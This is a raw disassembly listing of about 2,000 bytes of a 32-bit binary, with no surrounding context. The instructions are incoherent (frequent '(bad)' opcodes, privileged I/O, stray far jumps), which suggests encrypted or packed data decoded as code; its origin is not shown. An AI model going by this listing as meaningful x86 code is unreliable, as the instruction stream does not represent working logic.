  4025b8:	(bad)  
  4025b9:	push   esp
  4025bb:	or     al,BYTE PTR [ecx]
  4025bd:	(bad)
  4025c0:	(bad)
  4025c3:	shl    al,0xf1
  4025c6:	repz out dx,al
  4025c8:	mov    eax,0xddf8c8ff
  4025cd:	repnz mov edi,0xfbdde2f2
  4025d3:	shl    ebx,cl
  4025d5:	loope  0x4025d6
  4025d7:	pandn  mm2,mm5
  4025da:	add    bh,ch
  4025dc:	(bad)  
  4025dd:	test   eax,0xc1e5f0ca
  4025e2:	sti    
  4025e3:	lock out 0xd4,eax
  4025e6:	aad    0xfb
  4025e8:	lods   al,BYTE PTR ds:[esi]
  4025e9:	idiv   edi
  4025eb:	icebp  
  4025ec:	ret    
  4025ed:	in     eax,dx
  4025ee:	cmc    
  4025ef:	shl    ah,cl
  4025f1:	mov    esp,0xc4f9f3bc
  4025f6:	(bad)  
  4025f7:	retf   0xdfe1
  4025fa:	in     eax,dx
  4025fb:	out    0xcc,al
  4025fd:	mov    ecx,0xd6f3e0cf
  402602:	rol    eax,0xc4
  402605:	out    dx,eax
  402606:	hlt    
  402607:	call   0xc032f9f2
  40260c:	iret   
  40260d:	sar    al,cl
  40260f:	mov    ebp,0xc0f8dde1
  402614:	add    esi,eax
  402616:	std    
  402617:	add    dl,ch
  402619:	aam    0xf3
  40261b:	clc    
  40261c:	fisubr WORD PTR [edx-0x2f081d3e]
  402622:	div    edx
  402624:	int    0xb9
  402626:	neg    al
  402628:	aam    0xbe
  40262a:	(bad)  
  40262c:	not    esi
  40262e:	fst    st(1)
  402630:	sti    
  402631:	(bad)  
  402633:	jmp    0x40260c
  402635:	sti    
  402636:	std    
  402637:	retf   
  402638:	jmp    0x402627
  40263a:	fxam   
  40263c:	fdivr  DWORD PTR [esi-0x2c364050]
  402642:	in     al,0xc7
  402644:	in     al,0xe4
  402646:	aad    0xf4
  402648:	not    ah
  40264a:	jmp    0xd104151c
  40264f:	mov    esp,0xd5f5d6d8
  402654:	inc    ah
  402656:	jmp    0x40262f
  402658:	(bad)  
  40265a:	or     ecx,DWORD PTR [ecx]
  40265c:	or     al,dl
  40265e:	jmp    0x40262c
  402660:	rol    bl,1
  402662:	int3   
  402663:	ror    ah,1
  402665:	mov    bh,0xd4
  402667:	cli    
  402668:	(bad)  
  40266a:	mov    edi,0xf5d8cab4
  40266f:	cld    
  402670:	loopne 0x40266d
  402672:	fld    DWORD PTR [ecx]
  402674:	fucomi st,st(1)
  402676:	fdiv   st,st(4)
  402678:	stc    
  402679:	fucomi st,st(3)
  40267b:	int    0xee
  40267d:	in     al,dx
  40267e:	ror    edi,0xeb
  402681:	jecxz  0x402670
  402683:	in     eax,0xb6
  402685:	lock scas al,BYTE PTR es:[edi]
  402687:	hlt    
  402688:	sar    BYTE PTR [edi-0x2c312621],cl
  40268e:	ret    
  40268f:	mov    esi,0xbd603bc
  402694:	or     dh,bh
  402696:	add    al,0x7
  402698:	add    BYTE PTR [esi],al
  40269a:	add    ebx,esp
  40269c:	leave  
  40269d:	mov    eax,0xc5b6e1af
  4026a2:	lock mov al,0xf3
  4026a5:	mov    bl,0xeb
  4026a7:	in     al,dx
  4026a8:	(bad)  
  4026a9:	(bad)
  4026ac:	call   0xbe1ff8b2
  4026b1:	aam    0xf5
  4026b3:	jecxz  0x4026b1
  4026b5:	jecxz  0x402697
  4026b7:	in     eax,0xe4
  4026b9:	out    dx,eax
  4026ba:	out    0xf,eax
  4026bc:	(bad)  
  4026bd:	jmp    0x4026af
  4026bf:	test   al,0xec
  4026c1:	mul    edx
  4026c3:	imul   eax
  4026c5:	mov    bl,0xf6
  4026c7:	iret   
  4026c8:	rcl    ecx,1
  4026ca:	(bad)  
  4026cc:	sar    DWORD PTR [edi-0xe311946],1
  4026d2:	out    0xe7,al
  4026d4:	out    0xd9,al
  4026d6:	fcmovu st,st(5)
  4026d8:	jmp    0xe4530ee3
  4026dd:	icebp  
  4026de:	int    0xc4
  4026e0:	cmc    
  4026e1:	retf   0xc6c2
  4026e4:	in     eax,dx
  4026e5:	(bad)  
  4026e6:	out    0xeb,al
  4026e8:	leave  
  4026e9:	(bad)  
  4026eb:	retf   
  4026ec:	idiv   DWORD PTR [ecx-0x2d21091e]
  4026f2:	fmul   DWORD PTR [ebx]
  4026f4:	or     ecx,ecx
  4026f6:	dec    dl
  4026f8:	mov    esp,0xc8dbfae4
  4026fd:	(bad)  
  4026fe:	ffree  st(4)
  402700:	icebp  
  402701:	shl    BYTE PTR [ebx-0x4f0e3626],1
  402707:	aam    0xfd
  402709:	(bad)  
  40270a:	jmp    0xba2e15d8
  40270f:	repz add eax,0x4bdc3d1
  402715:	cmc    
  402716:	fmul   st(1),st
  402718:	or     eax,DWORD PTR [ebx]
  40271a:	loopne 0x4026fc
  40271c:	shr    DWORD PTR [edx-0xf57500f],cl
  402722:	int3   
  402723:	aam    0xfb
  402725:	mov    ah,0xc0
  402727:	fsubp  st(6),st
  402729:	lock mov ecx,0xbfc1be03
  40272f:	shl    edx,1
  402731:	(bad)
  402734:	add    DWORD PTR [esi],eax
  402736:	(bad)  
  402737:	push   cs
  402738:	(bad)  
  402739:	out    dx,al
  40273a:	dec    BYTE PTR ds:0xc7b3d3d3
  402740:	ret    
  402741:	repz (bad) 
  402743:	hlt    
  402744:	in     al,dx
  402745:	iret   
  402746:	fcomip st,st(1)
  402748:	out    0xb8,al
  40274a:	int    0xe2
  40274c:	mov    esi,0xd5e2f7de
  402751:	(bad)  
  402753:	out    0x7,al
  402755:	mov    edi,0xeef5fed5
  40275a:	(bad)  
  40275c:	stc    
  40275d:	shr    DWORD PTR [ecx-0x16222917],cl
  402763:	retf   
  402764:	loopne 0x402735
  402766:	into   
  402767:	aam    0xd9
  402769:	shl    ebx,1
  40276b:	stc    
  40276c:	enter  0xd6d7,0xdf
  402770:	int3   
  402771:	shl    cl,0xe7
  402774:	in     al,0xe8
  402776:	in     eax,0xe3
  402778:	jmp    0x402742
  40277a:	or     DWORD PTR [ecx],eax
  40277c:	adc    ebp,esp
  40277e:	fsub   st(2),st
  402780:	mov    ebp,0xdaf7e7e4
  402785:	out    0xcf,eax
  402787:	icebp  
  402788:	fcomp  st(4)
  40278a:	(bad)  
  40278b:	aam    0xf2
  40278d:	hlt    
  40278e:	fild   WORD PTR [edx]
  402790:	add    dl,ah
  402792:	fsubrp st(6),st
  402794:	add    DWORD PTR ds:0xe909c507,eax
  40279a:	add    al,0x7
  40279c:	adc    ebp,DWORD PTR [eax-0xb3f0912]
  4027a2:	shr    esp,1
  4027a4:	ret    0xc9c1
  4027a7:	(bad)  
  4027a9:	fnsave [esi-0x46fe0731]
  4027af:	shl    bl,cl
  4027b1:	(bad)  
  4027b3:	loop   0x402771
  4027b5:	jmp    0xd63e027c
  4027ba:	clc    
  4027bb:	std    
  4027bc:	stc    
  4027bd:	shr    BYTE PTR [edi+edx*8-0x1c4d2822],cl
  4027c4:	enter  0xefc1,0xec
  4027c8:	aam    0xf0
  4027ca:	sar    DWORD PTR [edx-0x1f3e0317],cl
  4027d0:	add    edi,edi
  4027d2:	loopne 0x402791
  4027d4:	std    
  4027d5:	add    eax,0xf8dddee6
  4027da:	fsubr  st,st(5)
  4027dc:	icebp  
  4027dd:	jmp    0x4027c2
  4027df:	jecxz  0x4027c5
  4027e1:	icebp  
  4027e2:	les    ebp,FWORD PTR [ebp-0xe160c32]
  4027e8:	out    dx,al
  4027e9:	lock cld 
  4027eb:	int3   
  4027ec:	sti    
  4027ed:	loope  0x4027cb
  4027ef:	add    eax,DWORD PTR [eax]
  4027f1:	shl    ebp,0xe0
  4027f4:	(bad)  
  4027f5:	imul   dl
  4027f7:	add    bh,bl
  4027f9:	or     ebp,eax
  4027fb:	rcl    DWORD PTR [ecx],0xe4
  4027fe:	repz jmp 0xbc29dfb2
  402804:	into   
  402805:	(bad)  
  402807:	icebp  
  402808:	in     eax,dx
  402809:	aad    0xf5
  40280b:	into   
  40280c:	fst    st(6)
  40280e:	shr    ah,0xb8
  402811:	inc    edi
  402813:	inc    ah
  402815:	fadd   st(5),st
  402817:	(bad)  
  402819:	into   
  40281a:	fnclex 
  40281c:	jmp    0x4027db
  40281e:	out    dx,eax
  40281f:	jmp    0x402814
  402821:	leave  
  402822:	jmp    0x40281f
  402824:	(bad)  
  402825:	scas   eax,DWORD PTR es:[edi]
  402826:	mov    ecx,0xd9d4c4b6
  40282b:	int    0xd0
  40282d:	mov    esp,0xf1d9f1bd
  402832:	cld    
  402833:	mov    ecx,0x3d0fb06
  402838:	retf   
  402839:	int    0xe1
  40283b:	cli    
  40283c:	loopne 0x402829
  40283e:	mov    dl,0xf0
  402840:	call   0xb615df12
  402845:	out    dx,al
  402846:	out    0xd5,eax
  402848:	hlt    
  402849:	mov    edi,0xf5dacabf
  40284e:	shl    BYTE PTR [ebp+0x3f9c7],0xfe
  402855:	sti    
  402856:	pop    es
  402857:	fcmovnb st,st(4)
  402859:	push   es
  40285a:	(bad)  
  40285b:	fisttp WORD PTR [ebx]
  40285d:	mov    cl,0xd8
  40285f:	in     al,0xe1
  402861:	(bad)  
  402862:	aad    0xf3
  402864:	jmp    0x402837
  402866:	aad    0xdf
  402868:	cmc    
  402869:	leave  
  40286a:	aad    0xf6
  40286c:	mov    edx,0xdf07e7d0
  402871:	cli    
  402872:	(bad)  
  402873:	xlat   BYTE PTR ds:[ebx]
  402874:	out    0xf5,eax
  402876:	les    eax,FWORD PTR [ebx]
  402878:	cli    
  402879:	or     bl,bh
  40287b:	add    DWORD PTR ds:0xe2e4e6d1,ecx
  402881:	in     eax,0xf7
  402883:	aad    0xc7
  402885:	les    edi,FWORD PTR [edx-0x14173a0d]
  40288b:	fdiv   st(1),st
  40288d:	in     eax,dx
  40288e:	stc    
  40288f:	add    dh,ch
  402891:	cld    
  402892:	add    DWORD PTR [ebp+0x1f90bfe],edi
  402898:	jmp    0xcfef:0xce06e200
  40289f:	call   0xc70ede72
  4028a4:	jmp    0xf632eea4
  4028a9:	std    
  4028aa:	mov    esi,0xc2efd6fc
  4028af:	mov    eax,0xddc1c5cd
  4028b4:	jmp    0x4028b9
  4028b6:	in     eax,0xe8
  4028b8:	(bad)  
  4028ba:	loop   0x4028a1
  4028bc:	retf   0xcac7
  4028bf:	in     eax,dx
  4028c0:	ror    al,0xcc
  4028c3:	shl    al,1
  4028c5:	mov    bh,0xf4
  4028c7:	icebp  
  4028c8:	mov    edi,0xfad3e8b7
  4028cd:	(bad)  
  4028cf:	aad    0xfc
  4028d1:	cli    
  4028d2:	add    edi,DWORD PTR [ecx-0x25f42405]
  4028d8:	or     bl,bl
  4028da:	fxch   st(1)
  4028dc:	in     eax,dx
  4028dd:	(bad)  
  4028de:	in     eax,dx
  4028df:	int    0xcd
  4028e1:	in     eax,dx
  4028e2:	test   dl,0xc4
  4028e5:	(bad)  
  4028e6:	hlt    
  4028e7:	mov    edi,0xf0eaccdd
  4028ec:	out    dx,al
  4028ed:	fdivr  DWORD PTR [ebp-0x1fa4719]
  4028f3:	icebp  
  4028f4:	add    ch,al
  4028f6:	cmc    
  4028f7:	or     eax,eax
  4028f9:	enter  0xfb0a,0xf8
  4028fd:	loop   0x4028c4
  4028ff:	repnz imul DWORD PTR [edi+eiz*8-0xc444c0d]
  402907:	(bad)  
  402908:	mov    bh,0xcc
  40290a:	add    esi,ebp
  40290c:	clc    
  40290d:	mov    ebp,0x7eed9fd
  402912:	jmp    0x402919
  402914:	in     al,0x6
  402916:	fmulp  st(0),st
  402918:	inc    BYTE PTR [esi]
  40291a:	in     eax,0xfe
  40291c:	out    dx,al
  40291d:	jmp    0x4028d1
  40291f:	shr    dl,cl
  402921:	(bad)  
  402922:	out    dx,al
  402923:	cmc    
  402924:	in     al,0xc5
  402926:	ror    ecx,1
  402928:	ror    ecx,1
  40292a:	div    ebp
  40292c:	mov    eax,0xb8d5ccf0
  402931:	loope  0x402908
  402933:	sti    
  402934:	or     esp,ecx
  402936:	add    eax,ebx
  402938:	cli    
  402939:	hlt    
  40293a:	stc    
  40293b:	out    dx,al
  40293c:	adc    ebp,ebp
  40293e:	int    0xa5
  402940:	mov    dl,0xaf
  402942:	not    edx
  402944:	xlat   BYTE PTR ds:[ebx]
  402945:	in     al,0xfa
  402947:	mov    dh,0xb6
  402949:	mov    edi,0xe1e303ca
  40294e:	shl    esi,cl
  402950:	loopne 0x40292b
  402952:	in     al,0xf6
  402954:	or     edx,eax
  402956:	sti    
  402957:	test   bh,0xd4
  40295a:	or     dl,ch
  40295c:	add    ah,BYTE PTR [edi-0x134e5724]
  402962:	ret    0xc0d0
  402965:	shl    ch,cl
  402967:	jmp    0xec17ff61
  40296c:	sar    DWORD PTR [ebx+eax*8-0x43060505],cl
  402973:	mov    ecx,0xef4c2e3
  402978:	retf   0xdee5
  40297b:	add    eax,0xb7b3d903
  402980:	mov    ebp,0xebb1adac
  402985:	aam    0xd4
  402987:	vpmuludq ymm3,ymm3,ymm1
  40298b:	out    dx,al
  40298c:	ror    esp,1
  40298e:	cmc    
  40298f:	cld    
  402990:	fcmovbe st,st(6)
  402992:	fdivr  st,st(4)
  402994:	repnz (bad) 
  402996:	out    0xd4,al
  402998:	enter  0xdce8,0xf8
  40299c:	fldln2 
  40299e:	(bad)  
  40299f:	iret   
  4029a0:	out    0xe1,al
  4029a2:	rol    esp,0xc0
  4029a5:	call   0xb70d0577
  4029aa:	jmp    0xd4d5:0xf4e301ee
  4029b1:	aam    0xe6
  4029b3:	in     eax,0xe5
  4029b5:	test   ecx,0xf3c9d6db
  4029bb:	in     al,0xd8
  4029bd:	out    dx,al
  4029be:	fadd   st(2),st
  4029c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029c1:	aad    0xd1
  4029c3:	loop   0x40296d
  4029c5:	cmc    
  4029c6:	into   
  4029c7:	(bad)  
  4029c9:	neg    ah
  4029cb:	mov    ecx,0xc302edf0
  4029d0:	into   
  4029d1:	in     al,0x4
  4029d3:	push   es
  4029d4:	fld    QWORD PTR [edx]
  4029d6:	(bad)  
  4029d8:	out    0xcd,al
  4029da:	fisttp DWORD PTR [ebx]
  4029dc:	in     eax,dx
  4029dd:	(bad)  
  4029df:	mov    edi,0xd4c0b7c1
  4029e4:	mov    al,0xd4
  4029e6:	aam    0xc9
  4029e8:	out    0xe8,al
  4029ea:	mov    dh,0xd1
  4029ec:	neg    ecx
  4029ee:	rol    edi,1
  4029f0:	add    bh,BYTE PTR [ebp+0x6ffd2f2]
  4029f6:	fdiv   st(6),st
  4029f8:	cld    
  4029f9:	out    dx,eax
  4029fa:	inc    DWORD PTR [edi]
  4029fc:	(bad)  
  4029fd:	icebp  
  4029fe:	into   
  4029ff:	div    edi
  402a01:	fdiv   QWORD PTR [esp+ebp*4-0x4809071e]
  402a08:	ffree  st(5)
  402a0a:	cli    
  402a0b:	cld    
  402a0c:	add    dl,dl
  402a0e:	mov    edi,0xbf00601
  402a13:	pop    es
  402a14:	fcmovb st,st(1)
  402a16:	or     dh,dh
  402a18:	out    dx,eax
  402a19:	add    eax,0xed07e2ef
  402a1e:	mov    cl,0xf2
  402a20:	shr    al,cl
  402a22:	mov    bh,0xef
  402a24:	hlt    
  402a25:	les    ebp,FWORD PTR [esi-0xf33334a]
  402a2b:	jmp    0xf5ce:0xf8d4ddea
  402a32:	rcr    edx,1
  402a34:	aam    0xcb
  402a36:	add    al,BYTE PTR [edi]
  402a38:	pop    es
  402a39:	ret    
  402a3a:	or     ebx,eax
  402a3c:	push   cs
  402a3d:	call   0xcb2be8ef
  402a42:	imul   eax
  402a44:	mov    ah,0xd6
  402a46:	imul   BYTE PTR [ebp-0x1c012a0b]
  402a4c:	int    0xef
  402a4e:	ret    0xf800
  402a51:	cmc    
  402a52:	cli    
  402a53:	out    0xf1,al
  402a55:	or     ch,bl
  402a57:	(bad)  
  402a58:	fnsetpm(287 only) 
  402a5a:	add    eax,0xb2f0e008
  402a5f:	xlat   BYTE PTR ds:[ebx]
  402a60:	repnz scas eax,DWORD PTR es:[edi]
  402a62:	(bad)  
  402a63:	jmp    0xf2d8:0xb9e8d8f0
  402a6a:	fcmovnu st,st(1)
  402a6c:	repz iret 
  402a6e:	loop   0x402a63
  402a70:	repz fadd st,st(3)
  402a73:	std    
  402a74:	rcl    ah,cl
  402a76:	(bad)  
  402a78:	retf   0xf3ff
  402a7b:	add    dl,BYTE PTR [ebx]
  402a7d:	in     al,0xd0
  402a7f:	(bad)  
  402a81:	jmp    0x402a72
  402a83:	repz jmp 0x402a39
  402a86:	les    esi,FWORD PTR [eax-0x17454435]
  402a8c:	(bad)  
  402a8d:	in     al,dx
  402a8e:	mov    edx,0xd1e5d7fb
  402a93:	loope  0x402a65
  402a95:	(bad)
  402a99:	enter  0xbd4,0x5
  402a9d:	retf   0xf7e6
  402aa0:	fsubrp st(1),st
  402aa2:	mov    dh,0xb7
  402aa4:	hlt    
  402aa5:	fstp   TBYTE PTR [ecx-0x2a492205]
  402aab:	ror    esi,1
  402aad:	clc    
  402aae:	(bad)  
  402ab0:	repnz fiadd WORD PTR [edx]
  402ab3:	rcr    ebx,1
  402ab5:	leave  
  402ab6:	add    edi,ecx
  402ab8:	add    DWORD PTR [eax+eax*1],eax
  402abb:	sti    
  402abc:	adc    ebx,esi
  402abe:	in     eax,0xb1
  402ac0:	in     al,0xf0
  402ac2:	icebp  
  402ac3:	aam    0xc2
  402ac5:	cmc    
  402ac6:	aad    0xd6
  402ac8:	(bad)
  402acb:	loop   0x402aaa
  402acd:	sti    
  402ace:	fcmovbe st,st(7)
  402ad0:	add    ah,bl
  402ad2:	test   bl,0xe1
  402ad5:	fcmovu st,st(1)
  402ad7:	or     esp,esp
  402ad9:	(bad)  
  402ada:	(bad)  
  402adc:	add    eax,0xc4eee1e1
  402ae1:	enter  0xace0,0xd1
  402ae5:	in     eax,0xd1
  402ae7:	in     eax,0xcc
  402ae9:	mov    esi,0xf5d7bc
  402aee:	ret    0x6d6
  402af1:	mov    edi,0x205c4e3
  402af6:	in     al,0xf6
  402af8:	call   0xff23f0db
  402afd:	mov    edi,0xe0e1cee8
  402b02:	(bad)
  402b05:	mov    ah,0xc5
  402b07:	call   0xde3b08bc
  402b0c:	mul    eax
  402b0e:	add    ah,dh
  402b10:	fadd   st(6),st
  402b12:	(bad)  
  402b14:	fcmovb st,st(4)
  402b16:	sti    
  402b17:	jmp    0xdedf:0x120d02f9
  402b1e:	mov    bl,0xf1
  402b20:	iret   
  402b21:	icebp  
  402b22:	mov    dh,0xb6
  402b24:	out    0xf7,al
  402b26:	not    edi
  402b28:	sti    
  402b29:	repnz mov esp,0xb9cdd3c8
  402b2f:	jecxz  0x402aed
  402b31:	repz mov esi,0xcbcae2dd
  402b37:	mul    bh
  402b39:	out    dx,al
  402b3a:	std    
  402b3b:	retf   
  402b3c:	rcl    al,cl
  402b3e:	loop   0x402aec
  402b40:	int3   
  402b41:	fsubr  QWORD PTR [ebp-0x25461640]
  402b47:	into   
  402b48:	int    0xc9
  402b4a:	into   
  402b4b:	jecxz  0x402b1d
  402b4d:	jecxz  0x402b56
  402b4f:	sti    
  402b50:	aam    0xf0
  402b52:	ret    
  402b53:	(bad)  
  402b54:	(bad)  
  402b56:	(bad)  
  402b57:	div    esp
  402b59:	or     DWORD PTR [ebx*8-0xd210c17],eax
  402b60:	jecxz  0x402b11
  402b62:	mul    eax
  402b64:	mov    bl,0xbb
  402b66:	in     al,dx
  402b67:	les    edi,FWORD PTR [ebx-0x22c0d07]
  402b6d:	loope  0x402b63
  402b6f:	iret   
  402b70:	loopne 0x402b75
  402b72:	fsubr  st(0),st
  402b74:	test   DWORD PTR [eax],0xdacfc1fb
  402b7a:	add    ebx,esp
  402b7c:	into   
  402b7d:	rol    ebx,1
  402b7f:	shl    bh,cl
  402b81:	in     al,dx
  402b82:	repz loope 0x402b7a
  402b85:	mov    cl,0xe7
  402b87:	stc    
  402b88:	mov    bh,0xb6
  402b8a:	jecxz  0x402b87
  402b8c:	(bad)  
  402b8d:	fnstsw WORD PTR [ecx-0x22382119]
  402b93:	(bad)  
  402b94:	jmp    0xfc1f3259
  402b99:	out    dx,eax
  402b9a:	jmp    0xcfc2:0xc9c1ece5
  402ba1:	lods   al,BYTE PTR ds:[esi]
  402ba2:	cmc    
  402ba3:	mov    ebx,0xbabbdaee
  402ba8:	clc    
  402ba9:	call   0x10b0286
  402bae:	pop    es
  402baf:	aad    0xfc
  402bb1:	(bad)  
  402bb3:	ret    0x4de
  402bb6:	fxch   st(0)
  402bb8:	cli    
  402bb9:	out    0x13,eax
  402bbb:	add    al,0x5
  402bbd:	test   eax,0xd5ced6c3
  402bc2:	in     eax,dx
  402bc3:	call   0xb20be598
  402bc8:	call   0xf7f4fccb
  402bcd:	(bad)  
  402bcf:	clc    
  402bd0:	add    BYTE PTR [esi-0x1e07fc3e],bh
  402bd6:	in     al,0xfe
  402bd8:	(bad)  
  402bd9:	cli    
  402bda:	out    0xfd,al
  402bdc:	adc    DWORD PTR [esi-0x28374115],ebp
  402be2:	mov    cl,0xe9
  402be4:	shl    BYTE PTR [ecx+ebx*8-0x4736040a],cl
  402beb:	ret    
  402bec:	ret    
  402bed:	fdivr  QWORD PTR [eax-0x1ef9052e]
  402bf3:	(bad)  
  402bf4:	lock lock fcmovu st,st(0)
  402bf8:	in     al,0xec
  402bfa:	cld    
  402bfb:	fdivr  st,st(0)
  402bfd:	shl    BYTE PTR [edx-0x24502c53],cl
  402c03:	loop   0x402bd0
  402c05:	(bad)  
  402c06:	leave  
  402c07:	(bad)  
  402c09:	in     eax,dx
  402c0a:	lock out dx,eax
  402c0c:	stc    
  402c0d:	xlat   BYTE PTR ds:[ebx]
  402c0e:	test   DWORD PTR [ecx],0xd1f4f3ec
  402c14:	icebp  
  402c15:	call   esi
  402c17:	retf   0xc6ea
  402c1a:	clts   
  402c1c:	jmp    0x402c0f
  402c1e:	mov    cl,0xc2
  402c20:	in     al,dx
  402c21:	aam    0xee
  402c23:	in     al,dx
  402c24:	out    0xaf,eax
  402c26:	(bad)  
  402c29:	mov    ah,0xd8
  402c2b:	fdivrp st(6),st
  402c2d:	into   
  402c2e:	sar    ah,0xfc
  402c31:	lock push esp
  402c34:	clc    
  402c35:	add    dh,dh
  402c37:	xlat   BYTE PTR ds:[ebx]
  402c38:	fimul  DWORD PTR [esi]
  402c3a:	(bad)  
  402c3c:	iret   
  402c3d:	loopne 0x402bec
  402c3f:	jmp    0xeaba:0xf1cfd7e2
  402c46:	aad    0xe7
  402c48:	(bad)  
  402c49:	fidivr DWORD PTR [ebx-0x24480c45]
  402c4f:	jecxz  0x402c14
  402c51:	stc    
  402c52:	hlt    
  402c53:	clc    
  402c54:	in     al,0xe6
  402c56:	aam    0x9
  402c58:	or     cl,BYTE PTR [esi]
  402c5a:	hlt    
  402c5b:	fdivr  st,st(5)
  402c5d:	jmp    0xe730f727
  402c62:	repnz mov al,0xe2
  402c65:	(bad)  
  402c66:	mov    ebx,0xd5cac9f4
  402c6b:	cli    
  402c6c:	mov    al,0xf4
  402c6e:	jecxz  0x402c71
  402c70:	(bad)  
  402c72:	sti    
  402c73:	or     al,BYTE PTR ds:0x4fef50b
  402c79:	dec    ebp
  402c7b:	fmul   st,st(7)
  402c7d:	in     eax,dx
  402c7e:	stos   BYTE PTR es:[edi],al
  402c7f:	leave  
  402c80:	out    dx,eax
  402c81:	(bad)  
  402c82:	xlat   BYTE PTR ds:[ebx]
  402c83:	repnz mov ah,0xba
  402c86:	cli    
  402c87:	aam    0xb9
  402c89:	(bad)  
  402c8b:	add    ecx,edx
  402c8d:	mov    ecx,0xd5e2dfc0
  402c92:	add    edx,esp
  402c94:	lock or ebp,esi
  402c97:	stc    
  402c98:	loope  0x402c69
  402c9a:	clc    
  402c9b:	enter  0xd8ff,0xc6
  402c9f:	shl    BYTE PTR [eax-0x4c153335],1
  402ca5:	aad    0xd0
  402ca7:	in     al,dx
  402ca8:	cmc    
  402ca9:	repz into 
  402cab:	iret   
  402cac:	leave  
  402cad:	iret   
  402cae:	mov    esi,0xf7ecfcfb
  402cb3:	(bad)  
  402cb4:	mov    eax,0xfbe5fdf6
  402cb9:	fnclex 
  402cbb:	cld    
  402cbc:	add    edi,ebp
  402cbe:	ror    al,1
  402cc0:	mov    bl,0xe7
  402cc2:	out    dx,eax
  402cc3:	out    0xf3,al
  402cc5:	hlt    
  402cc6:	mov    ecx,0xd1bae5e4
  402ccb:	fild   WORD PTR [edx]
  402ccd:	loopne 0x402cbd
  402ccf:	(bad)  
  402cd1:	hlt    
  402cd2:	(bad)  
  402cd4:	loope  0x402cbf
  402cd6:	(bad)
  402cd9:	sysret 
  402cdb:	jecxz  0x402cd0
  402cdd:	shr    ah,1
  402cdf:	iret   
  402ce0:	out    0xeb,al
  402ce2:	retf   
  402ce3:	out    0xa8,al
  402ce5:	mov    al,0xfa
  402ce7:	(bad)  
  402ce8:	lods   al,BYTE PTR ds:[esi]
  402ce9:	hlt    
  402cea:	int3   
  402ceb:	call   0xfc39e8c5
  402cf0:	aad    0xfb
  402cf2:	rcl    ebp,1
  402cf4:	out    0xd1,al
  402cf6:	test   BYTE PTR [eax],0xe1
  402cf9:	fild   WORD PTR [esi]
  402cfb:	call   0xeef00004
  402d00:	loope  0x402cd8
  402d02:	ret    
  402d03:	repz loopne 0x402cc7
  402d06:	in     al,0xb5
  402d08:	in     eax,dx
  402d09:	iret   
  402d0a:	std    
  402d0b:	icebp  
  402d0c:	ret    0xe8f4
  402d0f:	repnz std 
  402d11:	mov    ebx,0xbe1ebf6
  402d16:	or     eax,DWORD PTR [eax]
  402d18:	retf   
  402d19:	or     ch,ah
  402d1b:	pop    es
  402d1c:	push   cs
  402d1d:	(bad)  
  402d1e:	in     eax,dx
  402d1f:	in     al,dx
  402d20:	mov    esp,0xfbc4c7f2
  402d25:	mov    bh,0xb2
  402d27:	inc    dh
  402d29:	into   
  402d2a:	mov    esi,0xb6b8cabd
  402d2f:	add    bh,BYTE PTR [edi-0x3cf83825]
  402d35:	fadd   st(6),st
  402d37:	(bad)  
  402d38:	clc    
  402d39:	stc    
  402d3a:	mov    BYTE PTR ds:0xe3c9a712,0xc5
  402d41:	xlat   BYTE PTR ds:[ebx]
  402d42:	in     eax,dx
  402d43:	retf   0xeadb
  402d46:	clc    
  402d47:	mov    dh,0xc8
  402d49:	clc    
  402d4a:	repz fstp TBYTE PTR [ebp-0x1e2130fe]
  402d51:	in     eax,0xe3
  402d53:	push   edx
  402d55:	leave  
  402d56:	xlat   BYTE PTR ds:[ebx]
  402d57:	xlat   BYTE PTR ds:[ebx]
  402d58:	std    
  402d59:	push   esp
  402d5b:	(bad)  
  402d5d:	mov    dl,0xc2
  402d5f:	int    0xe7
  402d61:	out    0xe3,al
  402d63:	loope  0x402d40
  402d65:	mov    ah,0xc8
  402d67:	cli    
  402d68:	repnz mov ecx,0xbbdffef4
  402d6e:	call   0xfc430d31
  402d73:	hlt    
  402d74:	jmp    0xfc05:0xc0e5d6d1
  402d7b:	fmulp  st(2),st
  402d7d:	test   al,0xc0
  402d7f:	in     al,0xf1
  402d81:	(bad)
  402d85:	into   
  402d86:	out    0xd5,al
  402d88:	fptan  
  402d8a:	icebp  
  402d8b:	not    dl
  402d8d:	rcl    ch,1
  402d8f:	icebp  
  402d90:	repz in eax,dx
  402d92:	(bad)  
  402d93:	loope  0x402d9e
  402d95:	jmp    0x402d93
  402d97:	add    dh,cl
  402d99:	or     ecx,DWORD PTR [ebx]
  402d9b:	add    edx,ebp
  402d9d:	mov    ecx,0xf6c6ade8
  402da2:	out    dx,eax
  402da3:	(bad)  
  402da4:	leave  
  402da5:	(bad)
  402da8:	cmc    
  402da9:	lock icebp 
  402dab:	std    
  402dac:	clc    
  402dad:	mov    ecx,0xcdb802f7
  402db2:	in     eax,0xb9
  402db4:	xlat   BYTE PTR ds:[ebx]
  402db5:	(bad)  
  402db6:	mov    esi,0xf8e6ddc5
  402dbb:	out    0xeb,al
  402dbd:	lods   al,BYTE PTR ds:[esi]
  402dbe:	shl    esi,1
  402dc0:	rol    dh,0xe3
  402dc3:	mov    cl,0xe8
  402dc5:	shl    DWORD PTR [edi-0x9164a06],1
  402dcb:	jmp    0xd83f1eb9
  402dd0:	ret    
  402dd1:	inc    al
  402dd3:	in     al,0xf2
  402dd5:	add    eax,0xd5bdd6
  402dda:	jmp    0xaeeb2fca
  402ddf:	scas   al,BYTE PTR es:[edi]
  402de0:	repnz aad 0xe0
  402de3:	shl    edx,0xb7
  402de6:	in     eax,dx
  402de7:	in     al,dx
  402de8:	hlt    
  402de9:	in     eax,0xb9
  402deb:	in     al,dx
  402dec:	aam    0x1
  402dee:	add    dh,ch
  402df0:	lock add al,0xe5
  402df3:	retf   
  402df4:	aam    0xeb
  402df6:	push   es
  402df7:	jecxz  0x402de4
  402df9:	or     eax,DWORD PTR [ebx]
  402dfb:	jmp    esp
  402dfd:	ror    esi,1
  402dff:	(bad)  
  402e00:	mov    bl,0xaf
  402e02:	rcr    bl,cl
  402e04:	sti    
  402e05:	in     al,dx
  402e06:	retf   
  402e07:	rol    dh,1
  402e09:	(bad)  
  402e0b:	out    dx,al
  402e0c:	add    ecx,ebx
  402e0e:	iret   
  402e0f:	out    0xfa,al
  402e11:	in     al,dx
  402e12:	(bad)
  402e15:	jmp    0x402e20
  402e17:	idiv   esp
  402e19:	enter  0xccfd,0xf8
  402e1d:	loopne 0x402e06
  402e1f:	int    0xd7
  402e21:	into   
  402e22:	icebp  
  402e23:	sti    
  402e24:	leave  
  402e25:	mov    edx,0xdaf0d3c7
  402e2a:	sti    
  402e2b:	sti    
  402e2c:	aam    0x3
  402e2e:	stc    
  402e2f:	repz std 
